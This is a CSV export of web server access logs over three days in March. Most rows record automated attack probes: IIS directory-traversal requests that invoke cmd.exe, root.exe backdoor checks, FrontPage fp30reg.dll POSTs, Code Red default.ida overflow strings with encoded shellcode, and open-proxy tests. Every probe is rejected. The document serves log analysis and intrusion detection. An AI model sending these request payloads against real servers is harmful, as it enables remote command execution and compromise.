"rhost";"date";"time";"timezone";"method";"request_first_line";"http_version";"final_state_code";"bytes";"referer";"user_agent";"compatibility";"MSIE";"MSIE_version";"OS";"OS_version"
"4.152.207.238";"Mar 01";"11:26:24";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1063;"";"";"";"";"";"";""
"65.96.54.37";"Mar 01";"11:37:20";500;"GET";"/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+ver";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"11:49:44";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"11:50:19";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"11:50:43";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1060;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"11:51:18";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"11:51:42";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"11:52:20";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"11:53:51";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"11:54:17";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"11:54:40";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"11:55:24";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"11:55:59";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1060;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"11:56:31";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1059;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"11:56:59";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1060;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"11:59:27";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1063;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"12:00:38";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1063;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"12:03:05";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1063;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"12:04:22";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1063;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"12:05:38";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1063;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"12:46:49";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"12:47:38";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"12:48:03";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1060;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"12:48:36";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"12:49:29";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"12:50:53";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"12:51:29";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"12:51:56";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"12:52:17";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"12:52:39";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"12:53:18";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1060;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"12:53:54";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1059;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"12:54:20";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1060;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"12:55:40";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1060;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"12:57:02";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1063;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"12:58:23";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1063;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"13:01:56";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1063;"";"";"";"";"";"";""
"4.152.207.238";"Mar 01";"13:03:13";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1063;"";"";"";"";"";"";""
"216.73.162.91";"Mar 01";"14:42:12";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"63.84.238.40";"Mar 01";"15:49:10";500;"GET";"/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir";"";404;1061;"";"";"";"";"";"";""
"63.84.238.40";"Mar 01";"15:49:10";500;"GET";"/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir";"";404;1061;"";"";"";"";"";"";""
"63.84.238.40";"Mar 01";"15:49:10";500;"GET";"/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir";"";404;1061;"";"";"";"";"";"";""
"63.84.238.40";"Mar 01";"15:49:10";500;"GET";"/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir";"";404;1061;"";"";"";"";"";"";""
"63.84.238.40";"Mar 01";"15:49:10";500;"GET";"/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir";"";404;1061;"";"";"";"";"";"";""
"63.84.238.40";"Mar 01";"15:49:10";500;"GET";"/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir";"";404;1061;"";"";"";"";"";"";""
"63.84.238.40";"Mar 01";"15:49:10";500;"GET";"/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir";"";404;1061;"";"";"";"";"";"";""
"63.84.238.40";"Mar 01";"15:49:10";500;"GET";"/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir";"";404;1061;"";"";"";"";"";"";""
"63.84.238.40";"Mar 01";"15:49:10";500;"GET";"/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir";"";404;1061;"";"";"";"";"";"";""
"63.84.238.40";"Mar 01";"15:49:10";500;"GET";"/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir";"";404;1061;"";"";"";"";"";"";""
"63.84.238.40";"Mar 01";"15:49:10";500;"GET";"/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir";"";404;1061;"";"";"";"";"";"";""
"63.84.238.40";"Mar 01";"15:49:10";500;"GET";"/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir";"";404;1061;"";"";"";"";"";"";""
"63.84.238.40";"Mar 01";"15:49:10";500;"GET";"/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir";"";404;1061;"";"";"";"";"";"";""
"63.84.238.40";"Mar 01";"15:49:11";500;"GET";"/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir";"";404;1061;"";"";"";"";"";"";""
"63.84.238.40";"Mar 01";"15:49:10";500;"GET";"/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir";"";404;1061;"";"";"";"";"";"";""
"63.84.238.40";"Mar 01";"15:49:10";500;"GET";"/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir";"";404;1061;"";"";"";"";"";"";""
"63.84.238.40";"Mar 01";"15:49:10";500;"GET";"/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir";"";404;1061;"";"";"";"";"";"";""
"63.84.238.40";"Mar 01";"15:49:10";500;"GET";"/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir";"";404;1061;"";"";"";"";"";"";""
"63.84.238.40";"Mar 01";"15:49:10";500;"GET";"/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir";"";404;1061;"";"";"";"";"";"";""
"63.84.238.40";"Mar 01";"15:49:10";500;"GET";"/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir";"";404;1061;"";"";"";"";"";"";""
"63.84.238.40";"Mar 01";"15:49:13";500;"GET";"/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir";"";404;1061;"";"";"";"";"";"";""
"4.35.221.243";"Mar 01";"16:19:04";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"66.249.194.119";"Mar 01";"18:07:04";500;"GET";"/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+ver";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"61.219.99.89";"Mar 01";"23:24:55";500;"GET";"/scripts/root.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"61.219.99.89";"Mar 01";"23:24:57";500;"GET";"/MSADC/root.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"61.219.99.89";"Mar 01";"23:24:57";500;"GET";"/c/winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"61.219.99.89";"Mar 01";"23:24:58";500;"GET";"/d/winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"61.219.99.89";"Mar 01";"23:24:59";500;"GET";"/scripts/..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"61.219.99.89";"Mar 01";"23:24:59";500;"GET";"/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"61.219.99.89";"Mar 01";"23:25:00";500;"GET";"/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"61.219.99.89";"Mar 01";"23:25:01";500;"GET";"/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"61.219.99.89";"Mar 01";"23:25:01";500;"GET";"/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"61.219.99.89";"Mar 01";"23:25:02";500;"GET";"/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"61.219.99.89";"Mar 01";"23:25:03";500;"GET";"/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"61.219.99.89";"Mar 01";"23:25:03";500;"GET";"/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"61.219.99.89";"Mar 01";"23:25:04";500;"GET";"/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";400;974;"";"";"";"";"";"";""
"61.219.99.89";"Mar 01";"23:25:05";500;"GET";"/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";400;974;"";"";"";"";"";"";""
"61.219.99.89";"Mar 01";"23:25:05";500;"GET";"/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"61.219.99.89";"Mar 01";"23:25:06";500;"GET";"/scripts/..%252f../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"193.109.122.11";"Mar 02";"01:31:15";500;"CONNECT";"193.109.122.67:6668";"HTTP/1.0";405;982;"";"pxyscand/2.0";"";"";"";"";""
"66.18.136.228";"Mar 02";"03:48:19";500;"GET";"/NULL.printer";"";404;1061;"";"";"";"";"";"";""
"67.170.85.231";"Mar 02";"05:54:48";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"195.166.22.231";"Mar 02";"05:56:14";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"68.201.200.65";"Mar 02";"07:06:07";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"172.155.134.244";"Mar 02";"11:58:54";500;"GET";"/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"216.74.229.19";"Mar 02";"16:56:50";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"220.170.233.137";"Mar 02";"17:01:51";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"210.82.34.25";"Mar 02";"18:27:42";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"218.64.24.205";"Mar 02";"18:31:43";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"70.80.223.173";"Mar 02";"20:57:15";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"58.8.0.252";"Mar 02";"21:13:07";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"203.112.195.156";"Mar 02";"23:37:03";500;"GET";"/scripts/root.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"203.112.195.156";"Mar 02";"23:37:16";500;"GET";"/MSADC/root.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"203.112.195.156";"Mar 02";"23:37:23";500;"GET";"/c/winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"203.112.195.156";"Mar 02";"23:37:32";500;"GET";"/d/winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"203.112.195.156";"Mar 02";"23:37:36";500;"GET";"/scripts/..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"203.112.195.156";"Mar 02";"23:37:39";500;"GET";"/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"203.112.195.156";"Mar 02";"23:37:46";500;"GET";"/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"203.112.195.156";"Mar 02";"23:37:54";500;"GET";"/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"203.112.195.156";"Mar 02";"23:38:01";500;"GET";"/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"203.112.195.156";"Mar 02";"23:38:08";500;"GET";"/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"203.112.195.156";"Mar 02";"23:38:12";500;"GET";"/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"203.112.195.156";"Mar 02";"23:38:18";500;"GET";"/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"203.112.195.156";"Mar 02";"23:38:25";500;"GET";"/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";400;974;"";"";"";"";"";"";""
"203.112.195.156";"Mar 02";"23:38:31";500;"GET";"/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";400;974;"";"";"";"";"";"";""
"203.112.195.156";"Mar 02";"23:38:40";500;"GET";"/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"203.112.195.156";"Mar 02";"23:38:47";500;"GET";"/scripts/..%252f../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"192.195.225.6";"Mar 03";"01:52:40";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"219.245.156.12";"Mar 03";"03:07:28";500;"GET";"http://oursns.net/get.asp?get=7144";"HTTP/1.1";404;1048;"";"Internet";"Explorer/4.01";"";"";"";""
"219.245.156.12";"Mar 03";"03:07:28";500;"GET";"http://oursns.net/get.asp?get=7144";"HTTP/1.1";404;1048;"";"Internet";"Explorer/4.01";"";"";"";""
"219.245.156.12";"Mar 03";"03:07:28";500;"GET";"http://oursns.net/get.asp?get=7144";"HTTP/1.1";404;1048;"";"Internet";"Explorer/4.01";"";"";"";""
"219.245.156.12";"Mar 03";"03:07:30";500;"GET";"http://oursns.net/get.asp?get=7144";"HTTP/1.1";404;1048;"";"Internet";"Explorer/4.01";"";"";"";""
"219.245.156.12";"Mar 03";"03:07:30";500;"GET";"http://oursns.net/get.asp?get=7144";"HTTP/1.1";404;1048;"";"Internet";"Explorer/4.01";"";"";"";""
"219.245.156.12";"Mar 03";"03:07:30";500;"GET";"http://oursns.net/get.asp?get=7144";"HTTP/1.1";404;1048;"";"Internet";"Explorer/4.01";"";"";"";""
"219.245.156.12";"Mar 03";"03:07:30";500;"GET";"http://oursns.net/get.asp?get=7144";"HTTP/1.1";404;1048;"";"Internet";"Explorer/4.01";"";"";"";""
"219.245.156.12";"Mar 03";"03:07:30";500;"GET";"http://oursns.net/get.asp?get=7144";"HTTP/1.1";404;1048;"";"Internet";"Explorer/4.01";"";"";"";""
"219.245.156.12";"Mar 03";"03:07:30";500;"GET";"http://oursns.net/get.asp?get=7144";"HTTP/1.1";404;1048;"";"Internet";"Explorer/4.01";"";"";"";""
"219.245.156.12";"Mar 03";"03:07:30";500;"GET";"http://oursns.net/get.asp?get=7144";"HTTP/1.1";404;1048;"";"Internet";"Explorer/4.01";"";"";"";""
"219.245.156.12";"Mar 03";"03:07:30";500;"GET";"http://oursns.net/get.asp?get=7144";"HTTP/1.1";404;1048;"";"Internet";"Explorer/4.01";"";"";"";""
"219.245.156.12";"Mar 03";"03:07:30";500;"GET";"http://oursns.net/get.asp?get=7144";"HTTP/1.1";404;1048;"";"Internet";"Explorer/4.01";"";"";"";""
"219.245.156.12";"Mar 03";"03:07:31";500;"GET";"http://oursns.net/get.asp?get=7144";"HTTP/1.1";404;1048;"";"Internet";"Explorer/4.01";"";"";"";""
"219.245.156.12";"Mar 03";"03:07:32";500;"GET";"http://oursns.net/get.asp?get=7144";"HTTP/1.1";404;1048;"";"Internet";"Explorer/4.01";"";"";"";""
"219.245.156.12";"Mar 03";"03:07:33";500;"GET";"http://oursns.net/get.asp?get=7144";"HTTP/1.1";404;1048;"";"Internet";"Explorer/4.01";"";"";"";""
"219.245.156.12";"Mar 03";"03:07:33";500;"GET";"http://oursns.net/get.asp?get=7144";"HTTP/1.1";404;1048;"";"Internet";"Explorer/4.01";"";"";"";""
"219.245.156.12";"Mar 03";"03:07:33";500;"GET";"http://oursns.net/get.asp?get=7144";"HTTP/1.1";404;1048;"";"Internet";"Explorer/4.01";"";"";"";""
"219.245.156.12";"Mar 03";"03:07:36";500;"GET";"http://oursns.net/get.asp?get=7144";"HTTP/1.1";404;1048;"";"Internet";"Explorer/4.01";"";"";"";""
"219.245.156.12";"Mar 03";"03:07:36";500;"GET";"http://oursns.net/get.asp?get=7144";"HTTP/1.1";404;1048;"";"Internet";"Explorer/4.01";"";"";"";""
"219.245.156.12";"Mar 03";"03:07:36";500;"GET";"http://oursns.net/get.asp?get=7144";"HTTP/1.1";404;1048;"";"Internet";"Explorer/4.01";"";"";"";""
"219.245.156.12";"Mar 03";"03:07:38";500;"GET";"http://oursns.net/get.asp?get=7144";"HTTP/1.1";404;1048;"";"Internet";"Explorer/4.01";"";"";"";""
"219.245.156.12";"Mar 03";"03:07:39";500;"GET";"http://oursns.net/get.asp?get=7144";"HTTP/1.1";404;1048;"";"Internet";"Explorer/4.01";"";"";"";""
"219.245.156.12";"Mar 03";"03:07:39";500;"GET";"http://oursns.net/get.asp?get=7144";"HTTP/1.1";404;1048;"";"Internet";"Explorer/4.01";"";"";"";""
"204.102.106.54";"Mar 03";"03:31:57";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"172.141.217.125";"Mar 03";"06:40:55";500;"GET";"/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"81.241.4.157";"Mar 03";"08:18:58";500;"GET";"/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"203.197.81.72";"Mar 03";"11:25:44";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"61.10.7.136";"Mar 03";"15:08:56";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"60.176.242.100";"Mar 03";"15:25:37";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"64.142.9.13";"Mar 03";"15:48:12";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"67.162.217.35";"Mar 03";"16:02:06";500;"GET";"/scripts/root.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.217.35";"Mar 03";"16:02:07";500;"GET";"/MSADC/root.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.217.35";"Mar 03";"16:02:07";500;"GET";"/c/winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.217.35";"Mar 03";"16:02:07";500;"GET";"/d/winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.217.35";"Mar 03";"16:02:08";500;"GET";"/scripts/..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.217.35";"Mar 03";"16:02:08";500;"GET";"/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.217.35";"Mar 03";"16:02:08";500;"GET";"/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.217.35";"Mar 03";"16:02:08";500;"GET";"/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.217.35";"Mar 03";"16:02:09";500;"GET";"/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.217.35";"Mar 03";"16:02:09";500;"GET";"/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.217.35";"Mar 03";"16:02:09";500;"GET";"/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.217.35";"Mar 03";"16:02:10";500;"GET";"/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"67.162.217.35";"Mar 03";"16:02:10";500;"GET";"/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";400;974;"";"";"";"";"";"";""
